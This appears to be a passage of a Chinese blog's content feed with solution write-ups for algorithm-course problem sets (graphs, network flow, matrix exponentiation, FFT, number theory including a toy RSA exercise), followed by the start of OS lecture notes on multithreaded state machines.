<li>给定一个 $n$ 个点 $m$ 条边的图，第 $i$ 个点会在 $t_i$ 时刻以及之后开放。有 $q$ 个询问，每个询问给定 $x,y,t$ ，问在 $t$ 时刻从 $x$ 到 $y$ 的最短距离。</li>
<li>$n\leq 200,q\leq 50000$。</li>
</ul>
<h3 id="题解-4"><a href="#题解-4" class="headerlink" title="题解"></a>题解</h3><p>仍然是对 Floyd-Warshall 算法的应用。我们按照节点开放的时间顺序作为中转点进行 floyd 并实时计算当前应该计算的询问即可。总时间复杂度 $O(n^3)$。</p>
]]></content>
      <tags>
        <tag>动态规划</tag>
        <tag>问题求解</tag>
        <tag>最短路</tag>
        <tag>压位</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解 III - 03 题解</title>
    <url>/2021/10/07/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20III%20-%2003%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-拓扑排序"><a href="#A-拓扑排序" class="headerlink" title="A. 拓扑排序"></a>A. 拓扑排序</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定 $n$ 个点 $m$ 条边的有向无环图，求字典序最小的拓扑序。</li>
<li>$n,m\leq 10^5$。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>将所有入度为 0 的点加入小根堆，每次取堆顶元素，更新其相邻节点的入度，并将新产生的入度为 0 的点入堆即可。总时间复杂度 $O(m+nlogn)$。</p>
<h2 id="B-Acesrc-Riding-the-Fences"><a href="#B-Acesrc-Riding-the-Fences" class="headerlink" title="B. Acesrc Riding the Fences"></a>B. Acesrc Riding the Fences</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定 $n$ 个点 $m$ 条边的无向图，保证存在欧拉路径/欧拉回路。求字典序最小的欧拉回路/路径。</li>
<li>$n\leq 500,m\leq 1024$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>基于 Fleury 算法的基本思想，给出如下的核心代码。该算法直接贪心地走尽可能小的邻边，不去详细分析某条边是否是桥，如果在有其他选择的时候走了桥，那么在回溯的时候会被自动视为最后走了桥。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fleury</span><span class="params">(<span class="keyword">int</span> cur)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sta[++stot]=cur;</span><br><span class="line">    <span class="built_in">rep</span>(i,<span class="number">1</span>,<span class="number">500</span>) <span class="keyword">if</span> (ga[cur][i])</span><br><span class="line">    &#123;</span><br><span class="line">        ga[cur][i]--;ga[i][cur]--;</span><br><span class="line">        <span class="built_in">fleury</span>(i);</span><br><span class="line">    &#125;</span><br><span class="line">    ans[++tot]=sta[stot--];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>时间复杂度 $O(nm)$，使用邻接表存储图可以做到 $O(n+m)$。</p>
<h2 id="C-旅行家"><a href="#C-旅行家" class="headerlink" title="C. 旅行家"></a>C. 旅行家</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一张 $n$ 个点 $m$ 条边的带权无向图。一条路径的代价是所有边的边权依次连接起来组成的数的大小。求 1 号节点到每个节点的代价的最小值对 $1e9+7$ 取模的结果。</li>
<li>$n,m\leq 10^5,1\leq w\leq 10^9$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>将每条边拆成位数条边，每条边的权值都是一位数，这样对这幅图做宽搜，边数最少的路径一定也是组成的数位数最小的路径。</p>
<p>一个困难点是如何处理权值相同的点。例如 $x$ 和 $y$ 的权值都是 123，$x$ 先出队并更新 $z$ 的权值为 1234 入队，$y$ 再出队并更新 $w$ 的权值为 1231 入队，这时队列中的单调性就被打破了。</p>
<p>因此我们应该将权值相同的点一并考虑，对于某种权值，对于所有满足该权值的点，从小到大枚举邻边，并将所有满足条件的相邻点打包起来放进队列。</p>
<p>新建的图中将有 $10m$ 级别的边，对于宽搜来说量级是可以接受的。</p>
<p>总时间复杂度 $O(\mid w\mid (n+m))$。</p>
]]></content>
      <tags>
        <tag>问题求解</tag>
        <tag>最短路</tag>
        <tag>欧拉路径</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解 III - 04 题解</title>
    <url>/2021/10/08/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20III%20-%2004%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-Acesrc’s-Bizarre-Adventure"><a href="#A-Acesrc’s-Bizarre-Adventure" class="headerlink" title="A. Acesrc’s Bizarre Adventure"></a>A. Acesrc’s Bizarre Adventure</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定 $n$ 个红色的点和 $n$ 个蓝色的点，每个点有坐标 $(x,y)$。如果一个蓝色的点满足两个坐标都是某个红色点坐标的两倍以上，则该蓝点和红点可以配对。问最多能配成多少对。</li>
<li>$n\leq 100$。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>在可以配对的蓝点和红点之间连边，该问题即转化为二分图最大匹配。可以利用匈牙利算法求解，也可以建立超级源点、超级汇点后求最大流。</p>
<h2 id="B-Acesrc-Doesn’t-Want-To-Bite-The-Dust"><a href="#B-Acesrc-Doesn’t-Want-To-Bite-The-Dust" class="headerlink" title="B. Acesrc Doesn’t Want To Bite The Dust"></a>B. Acesrc Doesn’t Want To Bite The Dust</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>有 $n$ 个二次函数，第 $i$ 个形如 $f_i(x)=a_ix^2+b_ix+c_i$，要求 $x_i\in [L_i,R_i]$。有 $m$ 个额外的限制，每个限制是一个三元组 $(u,v,d)$，表示要求 $x_u\leq x_v+d$。求在满足所有限制的情况下，$\sum_{i=1}^nf_i(x_i)$ 的最大值。</li>
<li>$n\leq 50,m\leq 100,-100\leq L_i,R_i\leq 100$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>原型是洛谷3227切糕，比较难想的最小割建模。</p>
<p>如果没有额外限制，那么一个最小割模型是显然的：对于每个函数，建一条有 $R-L+1$ 条边的链。每条边的容量是二次函数自变量在该处取值时的函数值。将 $n$ 条链的首尾分别与超级源点，超级汇点连接即可。</p>
<p>现在考虑如何满足额外限制。<strong>最小割建模模拟限制的核心思想在于使网络在约束不满足时有无法割去的 $s-t$ 通路。</strong> 对于一个 $x_u\leq x_v+d$，当 $x_v=x$ 时，我们在 $v$ 的函数上割去的是对应 $x$ 的边，那么 $x+1$ 即以上的边都属于 $T$ 集合。如果此时 $x_u\geq x+d+1$，那么边 $x+d+1$ 左边的节点一定在 $S$ 集合中。因此，我们只要对于每个 $x$，从 $u$ 函数的 $x+d+1$ 边左端点向 $v$ 函数的 $x+1$ 边左端点连容量为 $\infty$ 的边即可。</p>
<p>还有一个微小的问题是这样求出的是目标函数的最小值，而我们要求的是最大值。我们可以设定一个很大的阈值 $M$，然后令 $f’(x)=M-f(x)$，这样最小化 $\sum_{i=1}^nf’(x_i)$ 就是最大化 $\sum_{i=1}^nf(x_i)$。</p>
<h2 id="C-最小化"><a href="#C-最小化" class="headerlink" title="C. 最小化"></a>C. 最小化</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>有 $n$ 个变量，每个取值可以是 $-w$ 或 $w$。有 $q$ 个限制和一些目标函数，求目标函数最小值。</li>
<li>$n\leq 1000，q\leq 3000$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p><strong>每个变量只有两种取值，这种给一些变量进行二分类的需求是最小割模型的典型特征。</strong></p>
<p>我们建立超级源点、超级汇点，并给每个变量建一个点。在最终完成最小割的残余网络中，如果一个点连向 $s$ 表示它最终的取值是 $-w$，连向 $t$ 表示它最终的取值是 $w$。考虑如何建边以满足约束。</p>
<ul>
<li>每个节点向 $s$ 连容量为 $w$ 的边，表示割去这条边意味着该点去了 $T$，会付出 $w$ 的代价。类似地，每个节点向 $t$ 连容量为 $-w$ 的边。</li>
<li>对于限制 $w_x\leq w_y$，建立从 $y$ 到 $x$ ，容量为 $\infty$ 的边。这样如果 $y\in S,x\in T$，将会存在无法割去的 $s-t$ 通路。</li>
<li>对于限制 $w_x=w_y$ ，分别建立从 $x$ 到 $y$ 和从 $y$ 到 $x$，容量为 $\infty$ 的边。一旦这两个点分属于不同的集合，将会存在无法割去的 $s-t$ 通路。</li>
<li>对于限制 $w_x&lt;w_y$，相当于规定了 $w_x=-w,w_y=w$，我们在第一步的约束中修改 $(s,x)$ 和 $(y,t)$ 的容量为 $\infty$ 即可。</li>
<li>对于代价函数中的 $c|w_x-w_y|$ 部分，当 $w_x\neq w_y$ 时会产生 $2cw$ 的代价，否则没有代价。因此分别建立从 $x$ 到 $y$ 和从 $y$ 到 $x$，容量为 $2cw$ 的边。一旦这两个点分属于不同的集合，就必须割掉这条边付出相应的代价。</li>
<li>对于代价函数中的 $c(w_x-w_y)$ 部分，可以拆括号将系数分到每个变量自己头上。我们再次修改第一步中的权值，提前计算好每个变量在目标函数中被累加的次数，边权乘上该系数即可。</li>
</ul>
<p>该网络已经可以模拟原题，但还有一个问题在于该网络中存在负权，不方便使用最大流算法求解。<strong>解决负权的常用手法是先预计算一个小的代价，如果最终选择了大的再补差价</strong>。以第一种建边为例，我们先预先在答案中加上 $-w\cdot n$，表示先认为每个变量的取值都是 $-w$，这样建边时如果它确实是 $-w$，则代价为0，如果是 $w$ 则代价为 $2w$，从而转为非负权。其他部分的处理手法类似。</p>
]]></content>
      <tags>
        <tag>网络流</tag>
        <tag>二分图匹配</tag>
        <tag>问题求解</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解 III - 05 题解</title>
    <url>/2021/10/19/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20III%20-%2005%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-常系数线性递推"><a href="#A-常系数线性递推" class="headerlink" title="A. 常系数线性递推"></a>A. 常系数线性递推</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定递推式 $a_n=x_0+\sum_{i=1}^kx_ia_{n-i}$，求 $a_p$。</li>
<li>$k\leq 60,p\leq 2\times 10^9$。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>令向量<br>$$<br>x_{n}=<br>\left(<br>\begin{matrix}<br>a_n\\a_{n+1}\\ \vdots\\a_{n+k-1}\\x_0<br>\end{matrix}<br>\right)<br>$$<br>则令<br>$$<br>A=\left[\begin{matrix}1 &amp; 0 &amp; \cdots &amp; 0 &amp; 0\\0 &amp; 1 &amp; \cdots &amp; 0 &amp; 0\\<br>\vdots &amp; \vdots &amp; &amp; \vdots &amp; \vdots\\0 &amp; 0 &amp; \cdots &amp; 1 &amp; 0\\<br>x_k &amp; x_{k-1} &amp; \dots &amp; x_1 &amp; 1\\0 &amp; 0 &amp; \cdots &amp; 0 &amp; 1\end{matrix}\right]<br>$$<br>有<br>$$<br>Ax_n=x_{n+1}<br>$$<br>因此只要求 $A^{p-k+1}x_0$，即可求得 $a_p$。矩阵乘法可以用快速幂加速。总时间复杂度 $O(k^3logp)$。</p>
<h2 id="B-骨牌覆盖"><a href="#B-骨牌覆盖" class="headerlink" title="B. 骨牌覆盖"></a>B. 骨牌覆盖</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一个 $m$ 行 $n$ 列的棋盘，要求用 $1\times 2$ 的骨牌铺满，求方案数。</li>
<li>$n\leq 3,m\leq 10^{18}$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>当 $n=1$ 时，显然当 $m$ 为偶数时有 1 种方案，$m$ 为奇数时没有方案。</p>
<p>当 $n=2$ 时，容易发现答案是 Fibonacci 数列的第 $m$ 项，使用矩阵快速幂计算答案即可。</p>
<p>当 $n=3$ 时，首先考虑一个状压 dp 的思路：令 $dp[i][Mask]$ 表示当前看到第 $i$ 行，第 $i$ 行已经被覆盖的状态为 $Mask$ 的方案数。由于骨牌的长度不超过 2，所以在第 $i$ 行放骨牌只会影响第 $i$ 行和第 $i+1$ 行，从 $dp[i][Mask]$ 可以轻松转移到 $dp[i+1][Mask’]$。</p>
<p>但此题 $m$ 过大，需要优化该 dp 思路。我们可以把 $dp[i][Mask]\rightarrow dp[i+1][Mask’]$ 的转移方式写成一个 $8\times 8$ 的矩阵，将 $dp[i]$ 写成一个 $8$ 维向量，使得乘上该矩阵即可从 $i$ 转移到 $i+1$ ，这样就可以用矩阵快速幂优化了。</p>
<p>总时间复杂度 $O(2^nlogm)$。</p>
<h2 id="C-简单的题"><a href="#C-简单的题" class="headerlink" title="C. 简单的题"></a>C. 简单的题</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定有 $t$ 条边的无向图，求从 $s$ 到 $t$ 恰好经过了 $n$ 条边的最短路。</li>
<li>$n\leq 10^6,t\leq 100$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>由于边数不多，所以图中的点数至多是百级。设该图的邻接矩阵为 $A$，考虑 $A^n$，其中重新定义矩阵乘法的运算，用 $+$ 代替 $\times$，用 $\min$ 代替 $+$，可以证明这种新式矩阵乘法仍然满足结合律，所以仍然可以矩阵快速幂。$A^n$ 中保存的即为恰好经过 $n$ 条边的最短路。</p>
<p>总时间复杂度 $O(t^3logn)$。</p>
<h2 id="D-线段覆盖"><a href="#D-线段覆盖" class="headerlink" title="D. 线段覆盖"></a>D. 线段覆盖</h2><h3 id="题面描述-3"><a href="#题面描述-3" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定 $n$ 条线段，第 $i$ 条线段为 $[l_i,r_i]$。每条线段有一个代价 $c_i$，表示可以花费 $c_i$ 的代价使线段向左或向右延长一个单位长度。问要使得这些线段覆盖全部 $[0,m]$ 至少需要多少代价。</li>
<li>$n\leq 1000,m\leq 10^6$。</li>
</ul>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>考虑 $[0,m]$ 上有多少段还没有被线段覆盖，显然“空白段”的数量是 $O(n)$ 级别的。我们发现有如下重要性质：在最优的覆盖方案中，一个空白段不会被多个线段覆盖。</p>
<blockquote>
<ul>
<li>如果两个线段交汇在一个空白段的中间，那我们总可以缩短代价长的那个线段，增长代价小的线段，使得代价变小。</li>
<li>如果两个线段同时覆盖了一整个空白段，可以发现代价小的线段一定能以相同或更小的代价完成两个线段要覆盖的线段，因此不需要大代价线段付出。</li>
</ul>
</blockquote>
<p>基于以上重要性质，我们可以进行动态规划。令 $dp[i][j]$ 表示当前考虑到第 $i$ 个空白段，第 $i$ 个空白段是被第 $j$ 个线段覆盖的情况下的最小代价。转移分为两种情况：</p>
<ul>
<li>第 $i-1$ 段空白段也是被第 $j$ 个线段覆盖的，此时只需要根据第 $i-1$ 个空白段，第 $i$ 个空白段和第 $j$ 个线段的位置关系计算第 $j$ 个线段要完整覆盖住第 $i$ 个空白段所需的额外代价即可。</li>
<li>第 $i-1$ 段空白段不是被第 $j$ 个线段覆盖的。根据之前分析的性质，我们只需要考虑第 $i-1$ 段空白段被 $min(j,i)$ 之前的线段覆盖，因此只需要维护一个 dp 数组的前缀 min 即可。事实上在写代码时，我们可以直接用 $i-1$ 的全局最小值来更新答案，因为这样只会误计算一些非最优解的值，仍然可以保证我们算出最优解的代价。（当然维护前缀 min也是可以的）。</li>
</ul>
<p>总时间复杂度 $O(n^2)$。</p>
<p>此外在发现性质之后也可以建图跑最短路：为每条线段建一个点，为起点 0 和 终点 $m$ 也各建立一个点。之前的性质可以被翻译为：两条线段在延伸之后的相交处必然在某条线段的端点处。对于两条线段代表的点，我们只需要建从一条线段到另一条线段（左端点和右端点中较近的一个，取决于线段之间的相对位置）延伸所需的代价即可。该图是一个阶数为 $n$ 的稠密图，在上面跑不带堆优化的 Dijkstra 算法，也可在 $O(n^2)$ 内得到结果。</p>
]]></content>
      <tags>
        <tag>动态规划</tag>
        <tag>问题求解</tag>
        <tag>最短路</tag>
        <tag>矩阵乘法</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解 III - 06 题解</title>
    <url>/2021/10/19/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20III%20-%2006%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-最大内切球"><a href="#A-最大内切球" class="headerlink" title="A. 最大内切球"></a>A. 最大内切球</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定 $n$ 个半平面，求半平面围出的三维凸包的最大内切球的半径。</li>
<li>$\sum n\leq 2500$。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>设球的半径为 $r$，则我们的约束是球心到每个平面的距离不小于 $r$。此处根据空间解析几何的知识，如果一个半平面形如 $ax+by+cz+d\leq 0$，那么将其单位化之后（即令 $cos\alpha=\frac{a}{\sqrt{a^2+b^2+c^2}},cos\beta=\frac{b}{\sqrt{a^2+b^2+c^2}},$$cos\gamma=\frac{c}{\sqrt{a^2+b^2+c^2}}$，将方程改写为 $cos\alpha\cdot x+cos\beta\cdot y+cos\gamma\cdot z+\rho=0$的形式），直接将点的坐标代入即可得到点到平面的距离，因此每个约束都是一个线性不等式，共有 4 个变量，我们要最大化的式子就是 $r$，用单纯形求解即可。</p>
<h2 id="B-文理分科"><a href="#B-文理分科" class="headerlink" title="B. 文理分科"></a>B. 文理分科</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定排成矩阵的 $n\times m$ 个学生，每个学生学文有 $a_{ij}$ 的收益，学理有 $b_{ij}$ 的收益。如果一个学生和他相邻的所有学生都学文/理，可以额外获得 $sa_{ij}/sb_{ij}$ 的收益。求最大收益。</li>
<li>$n,m\leq 100$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>考虑最小割，我们先假设所有人拿满了学文学理的收益和区域相同的收益，考虑最少需要扣除多少收益。</p>
<ul>
<li><p>建立超级源点 $S$ 和超级汇点 $T$。</p>
</li>
<li><p>对于每个学生，从 $S$ 向他连容量为 $a_{ij}$ 的边，表示如果割去，他去学理，则会损失该部分收益。相似地，从他向 $T$ 连容量为 $b_{ij}$ 的边。</p>
</li>
<li><p>对于每个学生和其相邻人同时学文的情况，我们需要扣除该部分收益当且仅当这些人中至少有一个学理。因此我们从 $S$ 向该学生的一个“副本点”连容量为 $sa_{ij}$ 的边，再从该副本点向该学生及其相邻人连容量为 $\infty$ 的边。这样这些人中一旦有一个人学理，就不得不割去容量为 $sa_{ij}$ 的边。$sb$ 的处理方法类似。</p>
</li>
</ul>
<h2 id="C-Did-You-Just-Say-……-Acesrc"><a href="#C-Did-You-Just-Say-……-Acesrc" class="headerlink" title="C. Did You Just Say …… Acesrc?"></a>C. Did You Just Say …… Acesrc?</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一个 $2\times n$ 的“梯子”图，求该图有多少个连通的子图。</li>
<li>$n\leq 10^{18}$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>考虑动态规划。如果从左向右考虑，我们发现一个性质：到第 $i$ 列时，之前的点要么是连通的，要么分属两个连通块，且第 $i$ 列的两个点不连通。令 $f(i)$ 表示当前考虑到第 $i$ 列，只有一个连通块的方案数，$g(i)$ 表示当前考虑到第 $i$ 列，有两个连通块的方案数。稍微考虑以下第 $i$ 个“梯子格子”中的三条边，转移是容易的：<br>$$<br>\begin{align}<br>f(i)=4f(i-1)+g(i-1)\\<br>g(i)=2f(i-1)+g(i-1)<br>\end{align}<br>$$注意到该动态规划是线性递推，因此可以将 $f$ 和 $g$ 写成一个列向量，用矩阵表示转移，从而用矩阵快速幂优化转移。总时间复杂度 $O(logn)$。</p>
]]></content>
      <tags>
        <tag>动态规划</tag>
        <tag>网络流</tag>
        <tag>问题求解</tag>
        <tag>矩阵乘法</tag>
        <tag>线性规划</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解 III - 07 题解</title>
    <url>/2021/11/02/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20III%20-%2007%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-多项式乘法模板"><a href="#A-多项式乘法模板" class="headerlink" title="A. 多项式乘法模板"></a>A. 多项式乘法模板</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定一个 $n$ 次多项式 $A$ 和一个 $m$ 次多项式 $B$，求乘积。</li>
<li>$1\leq n,m\leq 10^5$。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>可以使用 FFT，介于多项式的系数不会太大，也可以使用 NTT。</p>
<h2 id="B-一个叫yjher的同学决定去做A-B-Problem"><a href="#B-一个叫yjher的同学决定去做A-B-Problem" class="headerlink" title="B. 一个叫yjher的同学决定去做A*B Problem"></a>B. 一个叫yjher的同学决定去做A*B Problem</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定两个大整数 $a,b$，求乘积。</li>
<li>$1\leq a,b\leq 10^{200000}$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>设 $a=\overline{a_na_{n-1}\cdots a_1a_0}$，考虑生成函数 $A(x)=a_0+a_1x+\cdots+a_nx^n$​，则 $a=A(10)$，$b$ 也是同理。因此只要求两个生成函数的乘积再将 10 代入即可。</p>
<h2 id="C-方程求解"><a href="#C-方程求解" class="headerlink" title="C. 方程求解"></a>C. 方程求解</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>$T$ 组数据，每次给定正整数 $n$，求四元不定方程 $ab+cd=n$ 的解的个数。</li>
<li>$T\leq 10000,n\leq 5\times 10^5$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>设 $ab=n$ 的解的个数为 $f(n)$，显然有 $f(n)=\sigma(n)$，其中 $\sigma(n)$ 表示 $n$ 的约数个数。那么原不定方程解的个数为<br>$$<br>F(n)=\sum_{i=1}^{n-1}f(i)f(n-i)<br>$$<br>该表达式是卷积形式，可以用 FFT 优化。</p>
<p>至于如何求 $\sigma(n)$ ，可以在线性筛素数的同时保存每个数的最小质因子，这样便可在 $O(nlogn)$ 的时间内完成 1-n 所有数的标准分解，从而确定每个数的约数个数。</p>
<p>总时间复杂度 $O(nlogn+T)$。</p>
<h2 id="D-讨厌质数的人"><a href="#D-讨厌质数的人" class="headerlink" title="D. 讨厌质数的人"></a>D. 讨厌质数的人</h2><h3 id="题面描述-3"><a href="#题面描述-3" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定 $n$ 个数的集合，求其最大的一个子集，使得子集中的数两两之和都不是质数。</li>
<li>$n\leq 3000,1\leq a_i\leq 10^5$。</li>
</ul>
<h3 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h3><p>对于任意两个数，如果它们的和是质数，就在它们之间连一条边。那么该问题就转化为了求图的最大独立集。</p>
<p>如果不考虑 1 的参与，那么有边的两个数一定是一个奇数一个偶数，所以这个图是一个二分图。此时再考虑 1，显然最终的集合里不会有两个1，因此如果有多个 1，只保留一个参与最大独立集的计算即可。</p>
<p>二分图的最大独立集等于总点数减去最大匹配，用网络流求解即可。一个不太紧的时间复杂度的上界是 $O(n^{2.5})$。</p>
]]></content>
      <tags>
        <tag>FFT/NTT</tag>
        <tag>网络流</tag>
        <tag>二分图匹配</tag>
        <tag>问题求解</tag>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>问题求解 III - 10 题解</title>
    <url>/2021/12/11/%E9%97%AE%E9%A2%98%E6%B1%82%E8%A7%A3%20III%20-%2010%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="A-加密"><a href="#A-加密" class="headerlink" title="A. 加密"></a>A. 加密</h2><h3 id="题面描述"><a href="#题面描述" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>使用题目中给定的一套类 RSA 算法加密，公钥 $E=2^{30}+3$。已知密文 $w^E\equiv C(mod\space n)$，给定 $n,C$，求原文 $w$。</li>
<li>$T\leq 10^5,n\leq 10^{18}$。</li>
</ul>
<span id="more"></span>

<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>根据题目中 $n$ 的生成方式可知，$n=pq$ 且 $p,q$ 的差非常小，因此可以从 $\sqrt n$ 开始往上往下枚举第一个 $n$ 的因子，即可得到 $p$ 和 $q$。那么 $\phi(n)=(p-1)(q-1)$，从而可以用扩展欧几里得求出 $E$ 关于 $\phi(n)$ 的逆元 $D$（密钥）。</p>
<p>根据数论知识，我们有 $C^{DE}\equiv w^{DE}\equiv w(mod\space n)$。因此使用快速幂求解 $C^{DE}$ 即可。</p>
<p>注：如果使用嵌套快速乘的快速幂，时间复杂度将达到 $O(T\log^2n)$，可能会超时。使用 <code>__int128</code> 类型可以避免这个问题。</p>
<h2 id="B-可以看见的点"><a href="#B-可以看见的点" class="headerlink" title="B. 可以看见的点"></a>B. 可以看见的点</h2><h3 id="题面描述-1"><a href="#题面描述-1" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定 $n\times n$ 的方格纸，问从 $(0,0)$ 出发可以画出多少种不同斜率的直线（直线必须经过至少两个格点）。</li>
<li>$n\leq 10^5$。</li>
</ul>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>设直线经过的另一个格点是 $(a,b)$ ，那么显然只有 $a,b$ 互质我们才应该将其计入答案，否则会导致重复计数。因此<br>$$<br>\begin{align}<br>ans&amp;=\sum_{i=1}^n\sum_{j=1}^n[\gcd(i,j)=1]\\<br>&amp;=1+2\sum_{i=1}^n\sum_{j=1}^{i-1}[\gcd(i,j)=1]\\<br>&amp;=1+2\sum_{i=1}^n\varphi(i)<br>\end{align}<br>$$因为此题 $n$ 只有 1e5，所以 $O(\log n)$ 地求每个数的欧拉函数值再求和即可。当 $n$ 更大时可以借助线性筛或数论筛法来解决。</p>
<h2 id="C-POWERMOD"><a href="#C-POWERMOD" class="headerlink" title="C. POWERMOD"></a>C. POWERMOD</h2><h3 id="题面描述-2"><a href="#题面描述-2" class="headerlink" title="题面描述"></a>题面描述</h3><ul>
<li>给定 $a,b,m$，求 $a^b(mod\space m)$。</li>
<li>$a,b,m\leq 10^{18}$。</li>
</ul>
<h3 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h3><p>此题的难点在于普通的快速幂在执行乘法时会爆 long long，所以我们应当用“快速乘”来代替普通的乘法。快速乘用 $O(\log n)$ 次加法来代替一次乘法，其原理和快速幂完全一样，大致的代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="function">LL <span class="title">quick_mul</span><span class="params">(LL x, LL y, LL m)</span> </span>&#123;</span><br><span class="line">    LL res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (y)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">1</span>) res = (res + x) % m;</span><br><span class="line">        x = (x + x) % m; y &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样我们可以在 $O(\log ^2n)$ 的时间复杂度内完成快速幂。 </p>
]]></content>
      <tags>
        <tag>问题求解</tag>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>NJU-OS Lecture 03: Multiprocessor Programming</title>
    <url>/2022/02/22/NJU-OS%20Lecture%2003%20-%20Multiprocessor%20Programming/</url>
    <content><![CDATA[<p>并发：一个计算机程序被分成了若干个部分，在不改变程序最终运行结果的情况下，这些部分被乱序地执行。并发执行的多个部分会共享资源。</p>
<span id="more"></span>

<h2 id="State-Machine"><a href="#State-Machine" class="headerlink" title="State Machine"></a>State Machine</h2><p>在单线程视角中，C 程序的状态机包括全局变量，堆区，栈帧列表等。全局变量和堆区的内容是全局的，是所有函数共享的，理应作为共享资源；栈帧中的变量都是局部变量，栈帧与栈帧之间独立性较强，可以交给多个线程。</p>
<p>多线程视角下的状态机：</p>
<ul>
<li>全局变量，堆区等全局共享资源；</li>
<li>若干个栈帧链，每条栈帧链属于一个线程。</li>
</ul>
<p>在并发程序中，每一步的结果都是 non-deterministic 的，它的状态转移图是长成这样的：</p>
<pre class="mermaid">stateDiagram-v2
    state1: (g, T1, T2)
    state1 --> state2: 线程T1执行
    state1 --> state3: 线程T2执行
